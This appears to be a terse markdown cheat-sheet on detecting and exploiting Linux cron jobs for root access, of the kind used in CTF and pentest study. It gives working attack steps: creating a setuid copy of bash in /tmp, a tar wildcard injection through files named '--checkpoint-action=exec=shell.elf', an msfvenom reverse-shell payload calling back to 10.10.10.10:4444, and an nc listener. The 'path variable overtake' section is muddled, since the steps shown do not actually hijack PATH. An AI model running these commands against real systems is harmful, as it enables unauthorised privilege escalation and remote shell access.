

###### Three major Technique for detect `CRON Jobs`
```
cat /etc/crontab
```

```
If you found any suspicious file inside /opt, /tmp or any other place  then check the file's last update time, because if there was a CRON-JOB running then time will update every single execution 
```

Some files you can't see any time because the time is hidden, that moment you can use this tool for check `cronjob`
```
pspy
```
###### Tool installation process:
Go to GitHub and click on `RELEASE` then select which one you wanna install.
Link: https://github.com/DominicBreuker/pspy
###### Kali direct installation command
```
sudo apt install pspy
```





###### Three techniques for exploit CRON-JOBs 
- Week file permissions
- Path Variable Overtake
- Bad coding Practice, means check file content

###### IF file Owner is a root user we can escalate privilege by path variable overtaking
File has no proper path set only file name inside CRON-JOB like `file.sh` instead of `/opt/file.sh` 
1st step:
```
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

2nd step:
```
/tmp/bash -p
```
`-p` tells **bash** to run in **privileged mode**.  
So `/tmp/bash -p` runs the `bash` binary stored at `/tmp/bash` with privileged mode enabled.




###### Cron jobs - Wildcards
Step 1: Create a payload 
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Step 2: Give permission
```
chmod +x /home/user/shell.elf
```

Step 3: Create these two files in /home/user
```
touch /home/user/--checkpoint=1  
touch /home/user/--checkpoint-action=exec=shell.elf
```

Step 4: Take shell access
```
nc -lvnp 4444
```